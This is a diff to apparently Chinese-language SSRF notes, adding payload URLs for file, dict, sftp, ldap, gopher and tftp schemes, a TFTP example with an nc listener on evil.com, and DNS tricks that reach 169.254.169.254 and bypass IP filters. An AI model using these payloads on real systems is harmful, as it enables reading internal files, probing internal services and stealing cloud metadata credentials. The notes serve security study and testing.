@@ -29,15 +29,32 @@ SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内�
   * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
   * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
   * `sftp://` `http://example.com/ssrf.php?url=sftp://evil.com:1337/`
-  * `ldap://` 轻量级目录访问协议
+  * `ldap://` LDAP(Lightweight Directory Access Protocol,轻量级目录访问协议)
     * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
     * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
     * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
-  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议
+  * `gopher://`
+    * `http://example.com/ssrf.php?url=http://evil.com/gopher.php` 重定向到 `gopher://`
+  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议) works over UDP
     * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
-  * `gopher://` Gopher是一种分布式文档传递服务
-    * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`
 
+
+Gopher协议 - 重要作用:
+(1)指定监听`ip` `port` `bytes`
+(2)you can exploit a SSRF to communicate with any TCP service.
+
+but you need to know how to talk to the service first.
+
+
+TFTP协议 - 重要作用:几乎可构造并发送任意的**UDP** packets
+```
+Request:
+https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET
+
+evil.com:# nc -v -u -l 12346
+Listening on [0.0.0.0] (family 0, port 12346)
+TESTUDPPACKEToctettsize0blksize512timeout6
+```
 
 ### 分类
 
@@ -159,6 +176,7 @@ SSRF漏洞分类
       * `127.0.0.1 <-> http://2130706433.xip.name`支持十进制. 支持任意前缀`ping qq.com.127.0.0.1.xip.name`
       * `10.100.21.7 <-> http://10.100.21.7.xip.io` `https://182.61.200.6.xip.io` SSL证书会"无效"
       * `127.0.0.1 <-> http://www.apple.com.anything.127.0.0.1.nip.io` 绕过不严谨的判断
+      * `169.254.169.254 <-> 1ynrnhl.xip.io` 云场景 (IPv4 Link Local Address)
     * 利用 https://sslip.io 支持ssl 支持ipv6
       * https://52-0-56-137.sslip.io/
   * DNS重绑定(DNS Rebinding) **重点** 攻击步骤
